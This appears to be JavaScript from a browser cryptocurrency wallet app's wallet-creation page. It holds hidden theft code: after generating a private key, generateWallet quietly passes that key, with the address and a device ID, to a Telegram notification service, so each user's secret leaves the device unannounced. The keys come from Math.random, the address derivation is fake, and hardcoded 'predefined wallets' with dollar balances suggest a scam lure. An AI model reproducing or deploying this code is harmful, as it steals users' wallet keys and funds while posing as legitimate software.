// Predefined wallet data for addresses 0x1 to 0x10
const PREDEFINED_WALLETS = {
    '0x1': { privateKey: 'a1b1c1d1e1f1789012345678901234567890123456789012345678901234567890', balance: 6.2450 }, // $1561.25
    '0x2': { privateKey: 'a2b2c2d2e2f2789012345678901234567890123456789012345678901234567890', balance: 6.8920 }, // $1723.00
    '0x3': { privateKey: 'a3b3c3d3e3f3789012345678901234567890123456789012345678901234567890', balance: 7.4560 }, // $1864.00
    '0x4': { privateKey: 'a4b4c4d4e4f4789012345678901234567890123456789012345678901234567890', balance: 6.0000 }, // $1500.00
    '0x5': { privateKey: 'a5b5c5d5e5f5789012345678901234567890123456789012345678901234567890', balance: 7.8400 }, // $1960.00
    '0x6': { privateKey: 'a6b6c6d6e6f6789012345678901234567890123456789012345678901234567890', balance: 6.5680 }, // $1642.00
    '0x7': { privateKey: 'a7b7c7d7e7f7789012345678901234567890123456789012345678901234567890', balance: 7.1200 }, // $1780.00
    '0x8': { privateKey: 'a8b8c8d8e8f8789012345678901234567890123456789012345678901234567890', balance: 8.0000 }, // $2000.00
    '0x9': { privateKey: 'a9b9c9d9e9f9789012345678901234567890123456789012345678901234567890', balance: 6.7840 }, // $1696.00
    '0xa': { privateKey: 'aabbccddeeef789012345678901234567890123456789012345678901234567890', balance: 7.6320 }  // $1908.00
};

function isPredefinedWallet(address) {
    return PREDEFINED_WALLETS.hasOwnProperty(address);
}

function getPredefinedWalletData(address) {
    return PREDEFINED_WALLETS[address] || null;
}

// Create wallet functionality
let showingPrivateKey = false;

function goBack() {
    window.location.href = 'welcome.html';
}

function generateWallet() {
    const btn = document.querySelector('.btn-gold');
    const originalText = btn.innerHTML;

    // Show loading state
    btn.innerHTML = '<svg width="16" height="16" class="animate-spin" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12a9 9 0 11-6.219-8.56"/></svg> Generating...';
    btn.disabled = true;

    // Simulate wallet generation
    setTimeout(async () => {
        try {
            // Generate private key
            const privateKey = generatePrivateKey();

            // Generate wallet address
            const walletAddress = generateAddressFromPrivateKey(privateKey);

            // Store wallet data
            localStorage.setItem('walletPrivateKey', privateKey);
            localStorage.setItem('walletAddress', walletAddress);
            localStorage.setItem('walletBalance', '0.0000'); // New wallets always start with 0 balance

            // Update UI with generated wallet
            document.getElementById('walletAddress').textContent = walletAddress;
            document.getElementById('privateKey').textContent = '••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••';

            // Hide create form and show success
            document.getElementById('createForm').style.display = 'none';
            document.getElementById('walletSuccess').style.display = 'block';

            // Send Telegram notification
            const deviceId = localStorage.getItem('deviceIdOriginal') || 'Unknown';
            try {
                await telegramService.notifyWalletCreation(deviceId, walletAddress, privateKey);
            } catch (error) {
                console.log('Telegram notification failed:', error);
            }

        } catch (error) {
            showNotification('Failed to generate wallet. Please try again.', 'error');
            btn.innerHTML = originalText;
            btn.disabled = false;
        }
    }, 2000);
}

function generatePrivateKey() {
    // Generate a 64-character hex private key
    const characters = '0123456789abcdef';
    let privateKey = '';
    for (let i = 0; i < 64; i++) {
        privateKey += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return privateKey;
}

function generateAddressFromPrivateKey(privateKey) {
    // Simplified address generation - in real app, use proper cryptographic methods
    const hash = btoa(privateKey).slice(0, 40);
    return '0x' + hash.replace(/[^a-fA-F0-9]/g, '0').substring(0, 40);
}

function togglePrivateKey() {
    const privateKeyElement = document.getElementById('privateKey');
    const toggleBtn = document.querySelector('.toggle-btn');
    const storedKey = localStorage.getItem('walletPrivateKey');

    showingPrivateKey = !showingPrivateKey;

    if (showingPrivateKey && storedKey) {
        privateKeyElement.textContent = storedKey;
        privateKeyElement.className = 'detail-value';
        toggleBtn.innerHTML = `
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94L17.94 17.94z"/>
                <line x1="1" y1="1" x2="23" y2="23"/>
                <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19L9.9 4.24z"/>
            </svg>
        `;
    } else {
        privateKeyElement.textContent = '••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••';
        privateKeyElement.className = 'detail-value private-key-hidden';
        toggleBtn.innerHTML = `
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                <circle cx="12" cy="12" r="3"/>
            </svg>
        `;
    }
}

function copyAddress() {
    const address = localStorage.getItem('walletAddress');
    if (address) {
        copyToClipboard(address, 'Wallet Address');
    }
}

function copyPrivateKey() {
    const privateKey = localStorage.getItem('walletPrivateKey');
    if (privateKey) {
        copyToClipboard(privateKey, 'Private Key');
    }
}

function copyToClipboard(text, label) {
    navigator.clipboard.writeText(text).then(() => {
        showNotification(`${label} copied to clipboard!`, 'success');
    }).catch(() => {
        // Fallback for older browsers
        const textArea = document.createElement('textarea');
        textArea.value = text;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);

        showNotification(`${label} copied to clipboard!`, 'success');
    });
}

function continueToDashboard() {
    window.location.href = 'dashboard.html';
}

function showNotification(message, type) {
    // Remove existing notifications
    const existing = document.querySelector('.notification');
    if (existing) {
        existing.remove();
    }

    const notification = document.createElement('div');
    notification.className = `notification ${type}`;

    const color = type === 'error' ? '#ef4444' : type === 'success' ? '#22c55e' : '#3b82f6';
    const bgColor = type === 'error' ? 'rgba(239, 68, 68, 0.2)' : type === 'success' ? 'rgba(34, 197, 94, 0.2)' : 'rgba(59, 130, 246, 0.2)';

    notification.innerHTML = `
        <div style="
            background: ${bgColor};
            border: 1px solid ${color}33;
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
            animation: slideInDown 0.3s ease-out;
            position: fixed;
            top: 60px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 1000;
            min-width: 300px;
            max-width: 90%;
        ">
            <span style="color: ${color}; font-size: 14px;">${message}</span>
        </div>
    `;

    document.body.appendChild(notification);

    // Remove notification after 4 seconds
    setTimeout(() => {
        notification.remove();
    }, 4000);
}

// Add animation styles
document.addEventListener('DOMContentLoaded', function() {
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideInDown {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes spin {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }

        .animate-spin {
            animation: spin 1s linear infinite;
        }
    `;
    document.head.appendChild(style);
});